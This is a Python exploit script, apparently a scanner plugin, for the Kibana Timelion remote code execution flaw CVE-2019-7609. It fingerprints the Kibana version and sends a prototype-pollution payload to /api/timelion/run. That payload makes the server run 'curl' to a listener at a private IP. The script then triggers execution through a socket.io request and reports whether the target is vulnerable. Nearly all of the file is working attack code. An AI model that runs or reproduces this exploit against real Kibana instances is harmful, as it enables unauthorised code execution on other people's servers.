import requests
from urllib.parse import urlparse
import html
import re
import time
from distutils.version import StrictVersion
import socket
import configparser
socket.setdefaulttimeout(15)
requests.packages.urllib3.disable_warnings()

name = 'Kibana未授权远程代码执行漏洞(CVE-2019-7609)'

def getVersion(url):
    try:
        response = requests.get(url+ '/app/kibana', timeout=15, verify=False)
        version = re.findall('"version":"(.*?)"',html.unescape(response.text))
        if version:
            return version[0]
        else:
            return ''
    except Exception as e:
        return ''

def run(url):
    host = urlparse(url)
    url = f"{host.scheme}://{host.netloc}"
    version = getVersion(url)
    if version:
        headers = {
                    'Content-Type':'application/json',
                    'kbn-version':version,
                    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0',
                    }
        if StrictVersion("5.6.15") <= StrictVersion(version) <= StrictVersion("6.6.1"):
            vulurl = url + '/api/timelion/run'
            payload = r'''{"sheet":[".es(*).props(label.__proto__.env.AAAA='require(\"child_process\").exec(\"curl http://192.168.43.217:8888\");process.exit()//')\n.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')"],"time":{"from":"now-15m","to":"now","mode":"quick","interval":"10s","timezone":"Asia/Shanghai"}}'''
            response = requests.post(vulurl, headers=headers, data=payload, timeout=15, verify=False)
            if 'seriesList' in response.text:
                headers['kbn-xsrf'] = "professionally-crafted-string-of-text"
                vulurl = url + '/socket.io/?EIO=3&transport=polling&t=MxubDPi'
                requests.get(vulurl, headers=headers, timeout=15, verify=False)
                return ['True',name,vulurl]
            else:
                return ['False',name]
        else:
            return ['False',name]
    else:
        return ['False',name]

if __name__ == '__main__':
    url = 'http://172.27.14.117:5601/'
    print(run(url))